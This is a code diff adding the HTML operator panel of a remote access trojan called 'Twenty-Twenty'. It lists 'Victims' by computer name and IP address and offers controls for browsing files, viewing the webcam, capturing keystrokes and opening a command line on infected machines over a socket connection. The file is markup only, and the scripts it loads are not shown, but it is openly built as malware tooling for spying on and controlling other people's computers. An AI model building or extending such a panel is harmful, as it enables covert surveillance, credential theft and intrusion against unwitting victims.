@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel</title>
+
+    <link href="styles/tailwindbuild.css" type="text/css" rel="stylesheet"/>
+    <link href="styles/styles.css" type="text/css" rel="stylesheet"/>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/socket.js"></script>
+    <script src="js/enums.js"></script>
+    <script src="js/utils.js"></script>
+    <script src="js/components.js"defer></script>
+    <script src="js/index.js" defer></script>
+</head>
+<body class="w-11/12 bg-gray-900 text-white">
+    <template id="victimItemTemplate">
+        <div class="victimItemWrapper max-w-sm w-full lg:max-w lg:flex rounded border-r border-b border-l border-orange-300 border-opacity-75 hover:border-orange-500 hover:border-opacity-100 overflow-hidden">
+            <div>
+                <h5 class="computer-name font-bold"></h5>
+                <h6 class="ip-address text-white-700"></h6>
+            </div>
+            <button class="select-button text-orange-400 hover:text-red-500">Select</button>
+        </div>
+    </template>
+
+    <template id="victimsPanelTemplate">
+        <div>
+            <h3>Victims</h3>
+            <div id="victimsList"></div>
+        </div>
+    </template>
+
+    <template id="commandPanelTemplate">
+        <div>
+            <div class="flex justify-end"><button id="closeButton">Close connection</button></div>
+            <div>
+                <h1>Computer Name: <span class="computer-name font-bold"></span></h1>
+                <h2>UUID: <span class="uuid text-white-700"></span></h2>
+                <h2>IP Address: <span class="ip-address text-white-700"></span></h2>
+            </div>
+            <div class="actions mt-1 flex flex-col items-center justify-center sm:mt-0 sm:flex-row sm:flex-wrap">
+                <button id="fileDirectory" class="action-buttons mt-2 flex items-center text-sm leading-5 text-white-500 sm:mr-6">
+                    <img class="icon-image flex-shrink-0 mr-1.5 h-5 w-5 text-white-400" src="images/storage-white-24dp.svg" alt="File_Directory">
+                    <span></span>File Directory</span>
+                </button>
+                <button id="webCamera" class="action-buttons mt-2 flex items-center text-sm leading-5 text-white-500 sm:mr-6">
+                    <img class="icon-image flex-shrink-0 mr-1.5 h-5 w-5 text-white-400" src="images/videocam-white-24dp.svg" alt="Web_Camera">
+                    <span>Web Camera</span>
+                </button>
+                <button id="keystrokes" class="action-buttons mt-2 flex items-center text-sm leading-5 text-white-500 sm:mr-6">
+                    <img class="icon-image flex-shrink-0 mr-1.5 h-5 w-5 text-white-400" src="images/keyboard-white-24dp.svg" alt="Keystrokes">
+                    <span>Keystrokes</span>
+                </button>
+                <button id="commandLine" class="action-buttons mt-2 flex items-center text-sm leading-5 text-white-500">
+                    <img class="icon-image flex-shrink-0 mr-1.5 h-5 w-5 text-white-400" src="images/code-white-24dp.svg" alt="Command_Line">
+                    <span>Command Line</span>
+                </button>
+            </div>
+            <div id="content" class="content flex justify-center"></div>
+        </div>
+    </template>
+
+
+    <header class="container mx-full">
+        <h1 class="primary-header-text">Twenty-Twenty</h1>
+        <h2 class="secondary-header-text">Remote Access Tojan</h2>
+    </header>
+    <main class="container mx-full h-full flex justify-center items-center">
+        <!-- Victims Panel Instance here -->
+        <span id="victimsPanelContainer" class="w-1/4"></span>
+        <!-- Command Panel Instance here -->
+        <span id="commandPanelContainer" class="command-panel w-3/4"></span>
+    </main>
+</body>
+</html>
